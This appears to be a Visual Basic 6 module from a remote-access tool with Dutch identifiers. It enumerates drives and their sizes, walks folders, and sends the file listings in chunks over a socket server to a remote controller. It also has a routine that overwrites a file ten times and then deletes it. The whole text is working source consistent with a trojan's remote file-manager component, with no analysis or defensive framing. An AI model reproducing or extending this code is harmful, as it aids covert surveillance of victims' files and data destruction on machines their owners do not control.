Attribute VB_Name = "Modfiles"
Private Type FILETIME
dwLowDateTime As Long
dwHighDateTime As Long
End Type

Private Type WIN32_FIND_DATA
dwFileAttributes As Long
ftCreationTime As FILETIME
ftLastAccessTime As FILETIME
ftLastWriteTime As FILETIME
nFileSizeHigh As Long
nFileSizeLow As Long
dwReserved0 As Long
dwReserved1 As Long
cFileName As String * 255
cAlternate As String * 14
End Type
Private Declare Function GetDiskFreeSpaceExA Lib "kernel32.dll" (ByVal lpRootPathName As String, lpFreeBytesAvailableToCaller As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
Private Declare Function GetVolumeInformationA Lib "kernel32.dll" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long

Public Declare Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function FindFirstFileA Lib "Kernel32" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFileA Lib "Kernel32" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindClose Lib "Kernel32" (ByVal hFindFile As Long) As Long
Private Declare Function GetLogicalDriveStringsA Lib "Kernel32" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveTypeA Lib "Kernel32" (ByVal nDrive As String) As Long
Public Drager As String
Public Teller As Long
Public Zal As Long

Public Function EnumDrives() As String
Dim TotalFreeBytes As Currency, TotalBytes As Currency
Dim sEDrives As String * 255
Dim sDrives As String
Dim sTmpDrv As String
sDrives = Left(sEDrives, GetLogicalDriveStringsA(255, sEDrives))
Do
sTmpDrv = Mid$(sDrives, 1, InStr(sDrives, vbNullChar) - 1)
sDrives = Mid$(sDrives, InStr(sDrives, vbNullChar) + 1)
EnumDrives = EnumDrives & sTmpDrv & Chr(45) & GetDriveTypeA(sTmpDrv) & _
Chr(45) & DriveSize(sTmpDrv) & Chr(35)
Loop While sDrives <> ""
End Function

Private Function DriveSize(ByVal strFileName As String) As String
   'On Error Resume Next
        Dim TotalFreeBytes As Currency, TotalBytes As Currency, VName As String, FSName As String
        VName = String$(255, vbNullChar): FSName = String$(255, vbNullChar)
        GetDiskFreeSpaceExA strFileName, 0, TotalBytes, TotalFreeBytes
        GetVolumeInformationA strFileName, VName, 255, 0, 0, 0, FSName, 255
        DriveSize = Round(((TotalFreeBytes * 10) / 1024 / 1050), 2) & " - " & Round(((TotalBytes * 10) / 1024 / 1050), 2) & " GB"
End Function

Public Function Zoeken(Mappen As String)
On Error Resume Next
Dim hFile As Long
Dim sFile As String
Dim Mr As String
Dim oFile As WIN32_FIND_DATA

hFile = FindFirstFileA(Mappen & "\*.*", oFile)

Do
sFile = oFile.cFileName
sFile = Left$(sFile, InStr(sFile, Chr$(0)) - 1)

If Left(sFile, 1) <> "." Then
Zal = 1
If oFile.dwFileAttributes And 16 Then
Drager = Drager & "|||" & sFile
Else
Drager = Drager & "|||" & sFile & "###" & FileLen(Mappen & "\" & oFile.cFileName) & "###" & Mr
End If
End If
If FindNextFileA(hFile, oFile) = 0 Then Exit Do
Loop
FindClose hFile

Teller = Len(Drager)
If Zal + 1020 < Teller Then
FrmMijn.SckServer.SendData "STRFLS" & "///" & Mid(Drager, Zal, 1020) '
Zal = Zal + 1020
Else: FrmMijn.SckServer.SendData "STRFL2" & "///" & Right(Drager, Teller - Zal + 1)
End If
End Function

Function SCRDel(Path As String)
    On Error Resume Next
    Dim Data1 As String, X As Integer
    Data1 = ""
    For X = 1 To 10
    Open Path For Output As #1
    Write #1, , Data1
    Close #1
    Next X
    Kill Path
End Function
